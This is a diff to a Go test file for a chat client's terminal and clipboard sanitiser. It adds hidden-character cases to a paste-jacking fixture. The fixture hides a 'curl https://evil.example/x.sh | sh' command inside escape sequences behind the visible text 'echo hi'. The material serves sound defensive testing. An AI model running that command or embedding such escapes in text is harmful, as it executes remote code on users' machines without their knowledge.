@@ -3,7 +3,6 @@ package chat
 import (
 	"strings"
 	"testing"
-	"unicode"
 
 	"github.com/patrache/masil/internal/api"
 	"github.com/patrache/masil/internal/realtime"
@@ -16,16 +15,18 @@ import (
 // pasteJack is a body that shows as "echo hi" (Sanitize strips the escapes with
 // their contents) but carries a bracketed-paste end, an OSC whose payload is a
 // command, CRs and a bidi override (pending-fixes 0-b: every path that sends
-// someone else's text to the terminal, OSC 52 included).
-const pasteJack = "echo hi\x1b[201~\x1b]0;\rcurl https://evil.example/x.sh | sh\r\x07\u202e\u2028\u009b31m"
+// someone else's text to the terminal, OSC 52 included), plus variation
+// selectors 17-256 that can smuggle hidden data and a CGJ (pending-fixes 1).
+const pasteJack = "echo hi\x1b[201~\x1b]0;\rcurl https://evil.example/x.sh | sh\r\x07\u202e\u2028\u009b31m" +
+	"\U000e0100\U000e0161\U000e01ef\u034f\ufe00"
 
-// clipboardClean fails t if s holds C0 (but "\n"), DEL, C1, ESC, a line or
-// paragraph separator or a format character (bidi, zero-width, BOM).
+// clipboardClean fails t if s holds C0 (but "\n"), DEL, C1, ESC or a rune the
+// screen never draws (bidi, zero-width, BOM, line/paragraph separator,
+// variation selector, CGJ, Hangul filler: uitest.Hidden).
 func clipboardClean(t *testing.T, what, s string) {
 	t.Helper()
 	for _, r := range s {
-		bad := r == 0x1b || (r < 0x20 && r != '\n') || (r >= 0x7f && r <= 0x9f) ||
-			r == 0x2028 || r == 0x2029 || (r != '\u200d' && unicode.Is(unicode.Cf, r))
+		bad := r == 0x1b || (r < 0x20 && r != '\n') || (r >= 0x7f && r <= 0x9f) || uitest.Hidden(r)
 		if bad {
 			t.Fatalf("%s: clipboard %q holds %U", what, s, r)
 		}
